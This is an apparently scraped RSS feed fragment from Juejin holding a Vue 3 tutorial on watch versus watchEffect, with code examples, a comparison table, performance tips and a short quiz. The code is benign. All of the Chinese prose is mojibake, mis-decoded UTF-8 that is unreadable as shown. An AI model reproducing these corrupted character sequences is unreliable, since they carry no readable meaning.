<p>æ€»ä¹‹ï¼Œæœ¬ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€ä¸ªå®ç”¨ã€é«˜æ•ˆã€å¯é çš„è‡ªåŠ¨åŒ–ä»»åŠ¡å¤„ç†å¹³å°ï¼Œä¸ºå„ç§ä¸šåŠ¡åœºæ™¯æä¾›äº†å¼ºå¤§çš„ä»»åŠ¡è°ƒåº¦èƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3ä¸­ä½•æ—¶ç”¨watchï¼Œä½•æ—¶ç”¨watchEffectï¼Ÿæ ¸å¿ƒåŒºåˆ«åŠæ€§èƒ½ä¼˜åŒ–ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600489282823241778</link>    <guid>https://juejin.cn/post/7600489282823241778</guid>    <pubDate>2026-01-29T06:26:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600489282823241778" data-draft-id="7600370554069139482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3ä¸­ä½•æ—¶ç”¨watchï¼Œä½•æ—¶ç”¨watchEffectï¼Ÿæ ¸å¿ƒåŒºåˆ«åŠæ€§èƒ½ä¼˜åŒ–ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ    "/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,Trae"/> <meta itemprop="datePublished" content="2026-01-29T06:26:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kknone"/> <meta itemprop="url" content="https://juejin.cn/user/1366025597879930"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3ä¸­ä½•æ—¶ç”¨watchï¼Œä½•æ—¶ç”¨watchEffectï¼Ÿæ ¸å¿ƒåŒºåˆ«åŠæ€§èƒ½ä¼˜åŒ–ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ    
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1366025597879930/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kknone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:26:47.000Z" title="Thu Jan 29 2026 06:26:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€watch åŸºæœ¬æ¦‚å¿µä¸ç”¨æ³•</h2>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒæ¦‚å¿µ</h3>
<p>watch æ˜¯ Vue 3 ä¸­ç”¨äºç›‘å¬ç‰¹å®šæ•°æ®æºå˜åŒ–å¹¶æ‰§è¡Œå‰¯ä½œç”¨çš„ APIã€‚å®ƒé»˜è®¤æ˜¯æƒ°æ€§çš„ï¼Œåªæœ‰å½“ç›‘å¬çš„æºå‘ç”Ÿå˜åŒ–æ—¶æ‰ä¼šè§¦å‘å›è°ƒå‡½æ•°ã€‚è¿™ä½¿å¾— watch éå¸¸é€‚åˆå¤„ç†é‚£äº›éœ€è¦åœ¨ç‰¹å®šçŠ¶æ€å˜åŒ–æ—¶æ‰§è¡Œçš„å¼‚æ­¥æ“ä½œæˆ–å¤æ‚é€»è¾‘ã€‚</p>
<h3 data-id="heading-2">1.2 åŸºæœ¬ç”¨æ³•ç¤ºä¾‹</h3>
<h4 data-id="heading-3">Options API æ–¹å¼</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">question</span>: <span class="hljs-string">''</span>,
      <span class="hljs-attr">answer</span>: <span class="hljs-string">'Questions usually contain a question mark. ;-)'</span>,
      <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
    }
  },
  <span class="hljs-attr">watch</span>: {
    <span class="hljs-comment">// å½“ question å˜åŒ–æ—¶ï¼Œæ‰§è¡Œæ­¤å‡½æ•°</span>
    <span class="hljs-title function_">question</span>(<span class="hljs-params">newQuestion, oldQuestion</span>) {
      <span class="hljs-keyword">if</span> (newQuestion.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'?'</span>)) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>()
      }
    }
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">getAnswer</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">true</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">answer</span> = <span class="hljs-string">'Thinking...'</span>
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://yesno.wtf/api'</span>)
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">answer</span> = (<span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>()).<span class="hljs-property">answer</span>
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">answer</span> = <span class="hljs-string">'Error! Could not reach the API. '</span> + error
      } <span class="hljs-keyword">finally</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>
      }
    }
  }
}
</code></pre>
<h4 data-id="heading-4">Composition API æ–¹å¼</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { ref, watch } from 'vue'

const question = ref('')
const answer = ref('Questions usually contain a question mark. ;-)')
const loading = ref(false)

// ç›´æ¥ç›‘å¬ ref
watch(question, async (newQuestion, oldQuestion) =&gt; {
  if (newQuestion.includes('?')) {
    loading.value = true
    answer.value = 'Thinking...'
    try {
      const res = await fetch('https://yesno.wtf/api')
      answer.value = (await res.json()).answer
    } catch (error) {
      answer.value = 'Error! Could not reach the API. ' + error
    } finally {
      loading.value = false
    }
  }
})
&lt;/script&gt;

&lt;template&gt;
  &lt;p&gt;
    Ask a yes/no question:
    &lt;input v-model="question" :disabled="loading" /&gt;
  &lt;/p&gt;
  &lt;p&gt;{{ answer }}&lt;/p&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-5">1.3 é«˜çº§ç”¨æ³•</h3>
<h4 data-id="heading-6">ç›‘å¬åµŒå¥—å±æ€§</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Options API</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">watch</span>: {
    <span class="hljs-string">'some.nested.key'</span>(newValue) {
      <span class="hljs-comment">// å½“åµŒå¥—å±æ€§å˜åŒ–æ—¶è§¦å‘</span>
    }
  }
}

<span class="hljs-comment">// Composition API</span>
<span class="hljs-keyword">const</span> obj = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">some</span>: { <span class="hljs-attr">nested</span>: { <span class="hljs-attr">key</span>: <span class="hljs-number">0</span> } } })
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> obj.<span class="hljs-property">some</span>.<span class="hljs-property">nested</span>.<span class="hljs-property">key</span>,
  <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
    <span class="hljs-comment">// å½“åµŒå¥—å±æ€§å˜åŒ–æ—¶è§¦å‘</span>
  }
)
</code></pre>
<h4 data-id="heading-7">æ·±åº¦ç›‘å¬</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Options API</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">watch</span>: {
    <span class="hljs-attr">someObject</span>: {
      <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue, oldValue</span>) {
        <span class="hljs-comment">// ç›‘å¬å¯¹è±¡çš„æ‰€æœ‰åµŒå¥—å±æ€§å˜åŒ–</span>
      },
      <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span>
    }
  }
}

<span class="hljs-comment">// Composition API</span>
<span class="hljs-keyword">const</span> obj = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> })
<span class="hljs-comment">// ç›´æ¥ç›‘å¬ reactive å¯¹è±¡ä¼šè‡ªåŠ¨åˆ›å»ºæ·±åº¦ç›‘å¬</span>
<span class="hljs-title function_">watch</span>(obj, <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
  <span class="hljs-comment">// å½“å¯¹è±¡çš„ä»»ä½•åµŒå¥—å±æ€§å˜åŒ–æ—¶è§¦å‘</span>
})
</code></pre>
<h4 data-id="heading-8">ç«‹å³æ‰§è¡Œ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Options API</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">watch</span>: {
    <span class="hljs-attr">question</span>: {
      <span class="hljs-title function_">handler</span>(<span class="hljs-params">newQuestion</span>) {
        <span class="hljs-comment">// ç»„ä»¶åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
      },
      <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span>
    }
  }
}

<span class="hljs-comment">// Composition API</span>
<span class="hljs-title function_">watch</span>(
  question,
  <span class="hljs-function">(<span class="hljs-params">newQuestion</span>) =&gt;</span> {
    <span class="hljs-comment">// ç»„ä»¶åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
  },
  { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> }
)
</code></pre>
<h2 data-id="heading-9">äºŒã€watchEffect åŸºæœ¬æ¦‚å¿µä¸ç”¨æ³•</h2>
<h3 data-id="heading-10">2.1 æ ¸å¿ƒæ¦‚å¿µ</h3>
<p>watchEffect æ˜¯ Vue 3 ä¸­å¦ä¸€ä¸ªå¼ºå¤§çš„ä¾¦å¬å™¨ APIï¼Œå®ƒä¼šè‡ªåŠ¨æ”¶é›†å›è°ƒå‡½æ•°ä¸­çš„ä¾èµ–ï¼Œå¹¶åœ¨ä¾èµ–å‘ç”Ÿå˜åŒ–æ—¶é‡æ–°æ‰§è¡Œå›è°ƒã€‚ä¸ watch ä¸åŒï¼ŒwatchEffect ä¼šåœ¨ç»„ä»¶åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶ååœ¨ä¾èµ–å˜åŒ–æ—¶å†æ¬¡æ‰§è¡Œã€‚</p>
<h3 data-id="heading-11">2.2 åŸºæœ¬ç”¨æ³•ç¤ºä¾‹</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { ref, watchEffect } from 'vue'

const todoId = ref(1)
const data = ref(null)

// è‡ªåŠ¨æ”¶é›† todoId.value ä½œä¸ºä¾èµ–
watchEffect(async () =&gt; {
  const response = await fetch(
    `https://jsonplaceholder.typicode.com/todos/${todoId.value}`
  )
  data.value = await response.json()
})
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-12">2.3 é«˜çº§ç”¨æ³•</h3>
<h4 data-id="heading-13">å‰¯ä½œç”¨æ¸…ç†</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">(<span class="hljs-params">onCleanup</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/<span class="hljs-subst">${id.value}</span>`</span>, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
      <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
    })
  
  <span class="hljs-comment">// å½“ä¾èµ–å˜åŒ–æ—¶ï¼Œå…ˆæ‰§è¡Œæ¸…ç†å‡½æ•°</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    controller.<span class="hljs-title function_">abort</span>()
  })
})
</code></pre>
<h4 data-id="heading-14">è°ƒæ•´æ‰§è¡Œæ—¶æœº</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é»˜è®¤ï¼šåœ¨ç»„ä»¶æ›´æ–°å‰æ‰§è¡Œ</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {})

<span class="hljs-comment">// åœ¨ç»„ä»¶æ›´æ–°åæ‰§è¡Œ</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {}, { <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span> })
<span class="hljs-comment">// æˆ–ä½¿ç”¨åˆ«å</span>
<span class="hljs-title function_">watchPostEffect</span>(<span class="hljs-function">() =&gt;</span> {})

<span class="hljs-comment">// åŒæ­¥æ‰§è¡Œï¼Œä¸è¿›è¡Œæ‰¹å¤„ç†</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {}, { <span class="hljs-attr">flush</span>: <span class="hljs-string">'sync'</span> })
<span class="hljs-comment">// æˆ–ä½¿ç”¨åˆ«å</span>
<span class="hljs-title function_">watchSyncEffect</span>(<span class="hljs-function">() =&gt;</span> {})
</code></pre>
<h2 data-id="heading-15">ä¸‰ã€watch ä¸ watchEffect å¯¹æ¯”é€‰å‹</h2>
<h3 data-id="heading-16">3.1 æ ¸å¿ƒåŒºåˆ«å¯¹æ¯”</h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th>watch</th><th>watchEffect</th></tr></thead><tbody><tr><td><strong>ä¾èµ–è¿½è¸ª</strong></td><td>æ‰‹åŠ¨æŒ‡å®šç›‘å¬æº</td><td>è‡ªåŠ¨æ”¶é›†å›è°ƒä¸­çš„ä¾èµ–</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>æƒ°æ€§æ‰§è¡Œï¼Œä»…åœ¨æºå˜åŒ–æ—¶è§¦å‘</td><td>ç«‹å³æ‰§è¡Œï¼Œç„¶ååœ¨ä¾èµ–å˜åŒ–æ—¶è§¦å‘</td></tr><tr><td><strong>å‚æ•°è·å–</strong></td><td>å¯ä»¥è·å–æ–°æ—§å€¼</td><td>æ— æ³•ç›´æ¥è·å–æ–°æ—§å€¼</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ç›‘å¬ç‰¹å®šæ•°æ®æºï¼Œéœ€è¦è·å–æ–°æ—§å€¼</td><td>ç›‘å¬å¤šä¸ªä¾èµ–ï¼Œä¸éœ€è¦å…³å¿ƒå…·ä½“å“ªä¸ªä¾èµ–å˜åŒ–</td></tr></tbody></table>
<h3 data-id="heading-17">3.2 å·¥ä½œæµç¨‹å¯¹æ¯”</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[ç»„ä»¶åˆ›å»º] --&gt; B{ä½¿ç”¨ watch?}
    B --&gt;|æ˜¯| C[æŒ‡å®šç›‘å¬æº]
    C --&gt; D{æºå˜åŒ–?}
    D --&gt;|æ˜¯| E[æ‰§è¡Œå›è°ƒï¼Œè·å–æ–°æ—§å€¼]
    D --&gt;|å¦| F[ç­‰å¾…æºå˜åŒ–]
    
    A --&gt; G{ä½¿ç”¨ watchEffect?}
    G --&gt;|æ˜¯| H[æ‰§è¡Œå›è°ƒï¼Œè‡ªåŠ¨æ”¶é›†ä¾èµ–]
    H --&gt; I{ä¾èµ–å˜åŒ–?}
    I --&gt;|æ˜¯| J[å…ˆæ‰§è¡Œæ¸…ç†å‡½æ•°]
    J --&gt; H
    I --&gt;|å¦| K[ç­‰å¾…ä¾èµ–å˜åŒ–]
</code></pre>
<h3 data-id="heading-18">3.3 é€‰å‹å»ºè®®</h3>
<ol>
<li>
<p><strong>ä½¿ç”¨ watch çš„åœºæ™¯</strong>ï¼š</p>
<ul>
<li>éœ€è¦ç›‘å¬ç‰¹å®šçš„æ•°æ®æºå˜åŒ–</li>
<li>éœ€è¦è·å–å˜åŒ–å‰åçš„å…·ä½“å€¼</li>
<li>éœ€è¦æ‰§è¡Œæƒ°æ€§æ“ä½œï¼ˆä»…åœ¨æºå˜åŒ–æ—¶æ‰§è¡Œï¼‰</li>
<li>éœ€è¦æ·±åº¦ç›‘å¬æˆ–ç«‹å³æ‰§è¡Œç­‰é«˜çº§é…ç½®</li>
</ul>
</li>
<li>
<p><strong>ä½¿ç”¨ watchEffect çš„åœºæ™¯</strong>ï¼š</p>
<ul>
<li>éœ€è¦ç›‘å¬å¤šä¸ªä¾èµ–ï¼Œä¸”ä¸å…³å¿ƒå…·ä½“å“ªä¸ªä¾èµ–å˜åŒ–</li>
<li>éœ€è¦åœ¨ç»„ä»¶åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡</li>
<li>éœ€è¦è‡ªåŠ¨ç®¡ç†ä¾èµ–ï¼Œå‡å°‘ä»£ç ç»´æŠ¤æˆæœ¬</li>
<li>å¤„ç†å¼‚æ­¥æ“ä½œæ—¶éœ€è¦è‡ªåŠ¨æ¸…ç†å‰¯ä½œç”¨</li>
</ul>
</li>
</ol>
<h2 data-id="heading-19">å››ã€æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h2>
<h3 data-id="heading-20">4.1 é¿å…ä¸å¿…è¦çš„ç›‘å¬</h3>
<ul>
<li>åªç›‘å¬å®é™…éœ€è¦çš„æ•°æ®æºï¼Œé¿å…ç›‘å¬æ•´ä¸ªå¤§å¯¹è±¡</li>
<li>ä½¿ç”¨ getter å‡½æ•°ç›‘å¬åµŒå¥—å±æ€§ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ deep é€‰é¡¹</li>
<li>å¯¹äºä¸éœ€è¦æ·±åº¦ç›‘å¬çš„å¯¹è±¡ï¼Œé¿å…ä½¿ç”¨ deep: true</li>
</ul>
<h3 data-id="heading-21">4.2 åˆç†ä½¿ç”¨æ¸…ç†å‡½æ•°</h3>
<ul>
<li>åœ¨å¤„ç†å¼‚æ­¥æ“ä½œæ—¶ï¼ŒåŠ¡å¿…ä½¿ç”¨æ¸…ç†å‡½æ•°å–æ¶ˆæœªå®Œæˆçš„è¯·æ±‚</li>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ŒåŠæ—¶æ¸…ç†å®šæ—¶å™¨ã€äº‹ä»¶ç›‘å¬å™¨ç­‰èµ„æº</li>
</ul>
<h3 data-id="heading-22">4.3 ä¼˜åŒ–æ‰§è¡Œæ—¶æœº</h3>
<ul>
<li>æ ¹æ®å®é™…éœ€æ±‚é€‰æ‹©åˆé€‚çš„ flush é€‰é¡¹</li>
<li>å¯¹äºä¸éœ€è¦ç«‹å³æ‰§è¡Œçš„æ“ä½œï¼Œä½¿ç”¨é»˜è®¤çš„ pre æ—¶æœº</li>
<li>å¯¹äºéœ€è¦è®¿é—®æ›´æ–°å DOM çš„æ“ä½œï¼Œä½¿ç”¨ post æ—¶æœº</li>
</ul>
<h3 data-id="heading-23">4.4 é¿å…åœ¨ä¾¦å¬å™¨ä¸­æ‰§è¡Œæ˜‚è´µæ“ä½œ</h3>
<ul>
<li>å°†å¤æ‚è®¡ç®—é€»è¾‘æå–åˆ°è®¡ç®—å±æ€§ä¸­</li>
<li>å¯¹äºéœ€è¦é¢‘ç¹æ‰§è¡Œçš„æ“ä½œï¼Œè€ƒè™‘ä½¿ç”¨é˜²æŠ–æˆ–èŠ‚æµ</li>
</ul>
<h2 data-id="heading-24">äº”ã€è¯¾å Quiz</h2>
<h3 data-id="heading-25">é—®é¢˜ 1ï¼š</h3>
<p>åœ¨ Vue 3 ä¸­ï¼Œwatch å’Œ watchEffect çš„ä¸»è¦åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿè¯·è‡³å°‘åˆ—ä¸¾ 3 ç‚¹ã€‚</p>
<p><strong>ç­”æ¡ˆè§£æï¼š</strong></p>
<ol>
<li><strong>ä¾èµ–è¿½è¸ªæ–¹å¼</strong>ï¼šwatch éœ€è¦æ‰‹åŠ¨æŒ‡å®šç›‘å¬æºï¼Œè€Œ watchEffect ä¼šè‡ªåŠ¨æ”¶é›†å›è°ƒä¸­çš„ä¾èµ–ã€‚</li>
<li><strong>æ‰§è¡Œæ—¶æœº</strong>ï¼šwatch é»˜è®¤æ˜¯æƒ°æ€§çš„ï¼Œåªæœ‰å½“ç›‘å¬æºå˜åŒ–æ—¶æ‰ä¼šè§¦å‘ï¼›è€Œ watchEffect ä¼šåœ¨ç»„ä»¶åˆ›å»ºæ—¶ç«‹å³æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶ååœ¨ä¾èµ–å˜åŒ–æ—¶å†æ¬¡æ‰§è¡Œã€‚</li>
</ol>
<details>
<summary>å¾€æœŸæ–‡ç« å½’æ¡£</summary>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cmdragon.cn%2Fposts%2F09551ab614c463a6d6ca69818e8c2d52%2F" target="_blank" title="https://blog.cmdragon.cn/posts/09551ab614c463a6d6ca69818e8c2d52/" ref="nofollow noopener noreferrer">Vue 3ä¸­å¦‚ä½•æœ‰æ•ˆç®¡ç†ä¾¦å¬å™¨çš„æš‚åœã€æ¢å¤ä¸å‰¯ä½œç”¨æ¸…ç†ï¼Ÿ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cmdragon.cn%2Fposts%2Fb7bca5d20f628ac09f7192ad935ef664%2F" target="_blank" title="https://blog.cmdragon.cn/posts/b7bca5d20f628ac09f7192ad935ef664/" ref="nofollow noopener noreferrer">Vue 3 watchEffectï¼šå¦‚ä½•å®ç°å“åº”å¼ä¾èµ–çš„è‡ªåŠ¨è¿½è¸ªä¸å‰¯ä½œç”¨ç®¡ç†ï¼Ÿ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cmdragon.cn%2Fposts%2F2c6cdb100a20f10c7e7d4413617c7ea9%2F" target="_blank" title="https://blog.cmdragon.cn/posts/2c6cdb100a20f10c7e7d4413617c7ea9/" ref="nofollow noopener noreferrer">Vue 3 watchå¦‚ä½•åˆ©ç”¨immediateã€onceã€deepé€‰é¡¹å®ç°åˆå§‹åŒ–ã€ä¸€æ¬¡æ€§ä¸æ·±åº¦ç›‘å¬ï¼Ÿ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cmdragon.cn%2Fposts%2F757a1728bc1b9c0c8b317b0354d85568%2F" target="_blank" title="https://blog.cmdragon.cn/posts/757a1728bc1b9c0c8b317b0354d85568/" ref="nofollow noopener noreferrer">Vue 3ä¸­watchå¦‚ä½•é«˜æ•ˆç›‘å¬å¤šæ•°æ®æºã€è®¡ç®—ç»“æœä¸æ•°ç»„å˜åŒ–ï¼Ÿ</a></li>
